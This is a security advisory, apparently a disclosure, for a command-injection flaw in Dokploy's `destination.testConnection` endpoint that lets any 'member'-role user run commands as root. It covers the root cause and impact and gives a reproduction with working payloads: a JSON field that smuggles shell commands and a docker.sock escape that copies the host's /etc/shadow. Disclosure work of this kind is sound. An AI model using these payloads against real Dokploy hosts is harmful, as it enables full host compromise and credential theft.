repo.description:
## Summary

The `destination.testConnection` mutation interpolates user-controlled `accessKey`, `secretAccessKey`, `region`, `endpoint`, `provider`, and `bucket` into a `rclone ls` shell command, then runs it through `child_process.exec`. Fields are wrapped in `"..."` but never escaped, so a `"` in `accessKey` closes the quote and the shell parses the rest of the line as separate commands.

The endpoint is gated only by `withPermission("destination", "create")`. `checkPermission` short-circuits and returns early without calling `role.authorize()` whenever the caller has a static role and every requested resource is in `enterpriseOnlyResources`. `member` is a static role; `memberRole.destination` is the empty array; the settings page at `/dashboard/settings/destinations` redirects `member` away in `getServerSideProps`. The tRPC API behind that page has no equivalent guard.

The dokploy service runs uid 0 and binds `/var/run/docker.sock` from the host per the published `install.sh`. Root inside the container reaches host root via one `docker run -v /:/host alpine`.

Result: any user holding the lowest organization role obtains arbitrary command execution as root on the Dokploy host with one POST to `/api/trpc/destination.testConnection`.

## Affected

`Dokploy/dokploy`, `<= v0.29.4` and `main` HEAD `df98cea1` (current as of 2026-05-18). Confirmed live-exploitable on the published Docker image `dokploy/dokploy:latest` digest `sha256:dc3018f3b8db31bf1deb25585290b3e0e4763d824102fbff0c909d0d2920e7a8`; identical vulnerable code in `/app/dist/server.mjs` of that image and in every `main` and `canary` commit through `df98cea1`.

Default `install.sh` deployment on Linux. Stock config, stock roles, no enterprise license. Pre-condition: at least one user invited with role `member` (standard collaboration flow). No legacy `canCreate*` toggles or `accessedServers` grants required.

## Root cause

`apps/dokploy/server/api/routers/destination.ts:60-91`: `testConnection` interpolates six user-controlled fields into `` `rclone ls --s3-access-key-id="${accessKey}" ...` `` (`accessKey`/`secretAccessKey`/`region`/`endpoint` at lines 61-64, `provider` at line 73, `bucket` at line 78) and builds the final command at line 79, then passes the joined string to `execAsync` at line 91 (Node `child_process.exec`, shell-based; the cloud branch at line 89 uses `execAsyncRemote`). Values are quoted but never escaped; `"` in any field closes the quote.

`packages/server/src/services/permission.ts:83-89`: `checkPermission` computes `isStaticRole = memberRecord.role in staticRoles` at line 83, then returns early via `if (isStaticRole) { if (allEnterprise) return; }` (lines 85-89) without calling `role.authorize()` when every requested resource is in `enterpriseOnlyResources`. `member` is a static role; `destination` is in `enterpriseOnlyResources` (declared at `access-control.ts:58`, member-relevant entries through line 76).

`packages/server/src/lib/access-control.ts:187-194`: the inline comment at line 187 states that members cannot manage org-level enterprise resources, then declares `server: []`, `registry: []`, `certificate: []`, `destination: []`, `notification: []`, `auditLog: []`. The short-circuit at `permission.ts:89` overrides that role definition.

`apps/dokploy/pages/dashboard/settings/destinations.tsx:28-35`: `getServerSideProps` redirects every `role === "member"` request to `/`. The same redirect exists at `servers.tsx:36`, `registry.tsx:28`, `notifications.tsx:28`, `certificates.tsx:28`. The tRPC API behind those pages has no equivalent role check.

Repository-root `Dockerfile` plus the published `install.sh`: the dokploy service runs uid 0 (no `USER` directive in the image; `id` inside the running container returns `uid=0(root)`) and binds `/var/run/docker.sock` from the host (`install.sh`: `--mount type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock`). Root in the container reaches host root via one `docker run -v /:/host alpine`.

## Reproduction

`dokploy/dokploy:latest` (v0.29.4) deployed via `https://dokploy.com/install.sh`, default config, default roles.

1. Owner Alice invites Bob via `organization.inviteMember` with `role: "member"`. Bob accepts and signs in. Bob's DB row: `member.role = 'member'`, every `canCreate*`/`canAccessTo*` boolean `false`, `accessedServers = '{}'`.

2. Bob sends one tRPC POST as the freshly invited member:

```http
POST /api/trpc/destination.testConnection?batch=1 HTTP/1.1
Host: dokploy.example.com
Cookie: better-auth.session_token=<member-jwt>
Origin: https://dokploy.example.com
Content-Type: application/json

{"0":{"json":{"name":"poc","accessKey":"X\";id > /tmp/PWN; hostname >> /tmp/PWN; echo \"","secretAccessKey":"s","bucket":"b","region":"us-east-1","endpoint":"https://x.test","provider":"S3"}}}
```

Response: `HTTP/1.1 200 OK`, body `[{"result":{"data":{"json":null,"meta":{"values":["undefined"],"v":1}}}}]`.

3. `docker exec dokploy.1.<task-id> cat /tmp/PWN` inside the dokploy container returns:

```
uid=0(root) gid=0(root) groups=0(root)
<container-hostname>
```

Replacing the `accessKey` payload with `X\";docker run --rm -v /:/host alpine sh -c \"cat /host/etc/shadow > /host/tmp/SHADOW\"; echo \"` writes the host's `/etc/shadow` to `/tmp/SHADOW` on the host filesystem with `uid=0`. The file contains the host root's yescrypt hash (`root:$y$j9T$...`).

Live-verified: Member role obtains root command execution in the dokploy container and host root via `/var/run/docker.sock` with one tRPC POST. No UI navigation, no service-share grant, no legacy capability flag.

## Impact

- Arbitrary command execution as `uid 0` in the dokploy container, reachable by every authenticated organization member.
- Pivot to host root via `/var/run/docker.sock`: read of `/etc/shadow`, offline crack of the host yescrypt hash, full host filesystem and Docker daemon control.
- Cross-tenant compromise of every organization on the same Dokploy instance and every connected remote server registered through Dokploy.
- Triggered by the lowest legitimate organization role with one POST, no UI navigation, no audit-log entry (audit logging is enterprise-only via `packages/server/src/services/proprietary/audit-log.ts:25-28`).

## Credit

Jan Kahmen, [turingpoint](https://turingpoint.de) (jan@turingpoint.de).
